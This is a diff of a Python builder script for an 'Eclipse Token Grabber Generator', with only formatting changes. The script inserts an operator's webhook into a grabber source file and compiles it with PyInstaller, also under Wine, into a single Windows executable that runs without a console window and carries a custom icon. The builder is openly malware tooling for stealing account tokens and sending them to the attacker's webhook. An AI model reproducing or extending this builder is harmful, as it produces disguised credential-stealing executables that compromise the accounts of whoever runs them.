@@ -4,15 +4,16 @@ import subprocess
 import base64
 import os
 
+
 class Builder:
 
-    def __init__(self, webhook, out_file, os): 
+    def __init__(self, webhook, out_file, os):
         self.webhook = webhook
         self.out_file = out_file
         self.os = os
         self.path_to_pyinstaller = "/root/.wine/drive_c/users/root/Local Settings/Application Data/Programs/Python/Python38-32/Scripts/pyinstaller.exe"
 
-    def build(self):        
+    def build(self):
         f = open("code/eclipse-grabber.py", 'r')
         file = f.read()
         f.close()
@@ -41,12 +42,13 @@ class Builder:
         else:
             print("\nOS not supported\n")
         try:
-            os.remove(self.out_file+".py");os.remove(self.out_file+".spec")
+            os.remove(self.out_file+".py")
+            os.remove(self.out_file+".spec")
         except FileNotFoundError:
             pass
 
     def packageLinux(self):
-        compile_command = ["wine", self.path_to_pyinstaller, self.out_file+".py", "--onefile", "--noconsole", "--icon=img/exe_file.ico",]
+        compile_command = ["wine", self.path_to_pyinstaller, self.out_file+".py", "--onefile", "--noconsole", "--icon=img/exe_file.ico"]
         subprocess.call(compile_command)
 
     def packageWindows(self):
@@ -57,11 +59,13 @@ class Builder:
         compile_command = ["pyinstaller", "--onefile", "--noconsole", "--icon=img/exe_file.ico", self.out_file+".py"]
         subprocess.call(compile_command)
 
+
 def getArgs():
     parser = argparse.ArgumentParser(description='Eclipse Token Grabber Generator')
     parser.add_argument('-w', '--webhook', help='Add your webhook', default='')
-    parser.add_argument('-o', '--outfile', help='Name your Executable', default='')    
+    parser.add_argument('-o', '--outfile', help='Name your Executable', default='')
     return parser.parse_args()
+
 
 def checkOS():
     if platform == "linux" or platform == "linux2":
@@ -73,6 +77,7 @@ def checkOS():
     else:
         OS = "Unknown"
     return OS
+
 
 arguments = getArgs()
 if not arguments.webhook or not arguments.outfile or not arguments.webhook and not arguments.outfile:
